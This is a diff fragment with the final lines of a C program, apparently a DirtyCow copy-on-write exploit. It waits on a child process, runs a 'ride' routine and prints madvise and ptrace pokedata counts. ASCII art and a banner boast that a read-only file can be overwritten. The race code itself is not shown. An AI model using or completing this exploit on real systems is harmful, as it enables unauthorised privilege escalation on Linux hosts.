@@ -1,0 +1,32 @@
+waitpid(child_pid, NULL, 0);
+printf( "\nTurtwig rides DirtyCow\n\n");
+// printf("   _____    ____\n");
+// printf(" /      \\  |  o |\n");
+// printf("|        |/ ___\\|\n");
+// printf("|_________/\n");
+// printf("|_|_| |_|_|\n");
+// https://www.asciiart.eu/animals/reptiles/turtles
+printf("              __\n");
+printf("   .,-;-;-,. /'_\\\n");
+printf(" _/_/_/_|_\\_\\) /\n");
+printf("-<_><_><_><_>=/\n");
+printf(" `/_/====/_/-'\\_\\\n");
+printf("  \"\"     \"\"    \"\"\n");
+int rides = parent_ride(child_pid);
+fprintf(stderr, "\n\nmadvise count : %ld", *gp_madvise_count);
+fprintf(stderr, "\npokedata count : %ld\n", g_pokedata_count);
+printf( "\nTurtwig wins in %d rides :-)\n\n", rides);
+printf("+------------------------------------+\n");
+printf("| This read-only file can be updated |\n");
+printf("|       and that very quickly        |\n");
+printf("|           MoooOOOOooOooo!          |\n");
+printf("+------------------------------------+\n");
+printf("              o\n");
+printf("        (__)  o\n");
+printf("        (oo) o\n");
+printf("  /------\\/ \n");
+printf(" / | # - ||   \n");
+printf("*  ||----||  \n");
+printf("   ~~    ~~  \n\n");
+
+return 0;
